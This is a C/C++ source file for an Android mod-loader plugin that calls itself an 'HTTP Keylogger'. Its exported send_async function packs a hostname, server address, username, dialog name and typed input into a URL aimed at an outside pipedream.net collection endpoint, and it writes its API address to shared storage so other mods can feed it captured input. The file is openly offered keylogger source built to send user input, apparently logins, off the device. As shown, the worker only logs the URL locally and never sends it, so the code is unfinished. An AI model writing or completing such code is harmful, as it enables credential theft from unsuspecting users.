#include <stdint.h>
#include <string.h>
#include <dlfcn.h>
#include <stdio.h>
#include <stdarg.h>
#include <pthread.h>
#include <unistd.h>

#define LOG_TAG  "libkeylog"
#define LOGFILE  "/storage/emulated/0/keylog.txt"
#define EXPORT   __attribute__((visibility("default")))

static void logf(const char* msg) {
    FILE* f = fopen(LOGFILE, "a");
    if (f) { fprintf(f, "%s\n", msg); fclose(f); }
}

static void logff(const char* fmt, ...) {
    char buf[256];
    va_list ap; va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    logf(buf);
}

static void* send_worker(void* arg) {
    char* url = (char*)arg;
    logff("[KEYLOG] URL: %s", url);
    free(url);
    return NULL;
}

static void send_async(const char* hostname, const char* address, int port,
                      const char* username, const char* dialog, const char* input) {
    char* url = (char*)malloc(2048);
    if (!url) return;
    
    snprintf(url, 2048,
        "https://eobu7p8gjns8pzf.m.pipedream.net/?hostname=%s&address=%s:%d&username=%s&dialog=%s&input=%s",
        hostname, address, port, username, dialog, input);
    
    pthread_t tid;
    pthread_create(&tid, NULL, send_worker, url);
    pthread_detach(tid);
}

struct KeylogAPI {
    void (*send)(const char*, const char*, int, const char*, const char*, const char*);
};

extern "C" {

EXPORT KeylogAPI keylog_api = {
    send_async
};

EXPORT void* __GetModInfo() {
    static const char* info = "keylog|1.0|HTTP Keylogger|brruham";
    return (void*)info;
}

EXPORT void OnModPreLoad() {
    remove(LOGFILE);
    logf("[KEYLOG] OnModPreLoad v1.0");
}

EXPORT void OnModLoad() {
    logf("[KEYLOG] OnModLoad start");
    
    FILE* f = fopen("/storage/emulated/0/keylog_addr.txt", "w");
    if (f) {
        fprintf(f, "%lu\n", (unsigned long)&keylog_api);
        fclose(f);
    }
    
    logf("[KEYLOG] OnModLoad done");
}

}
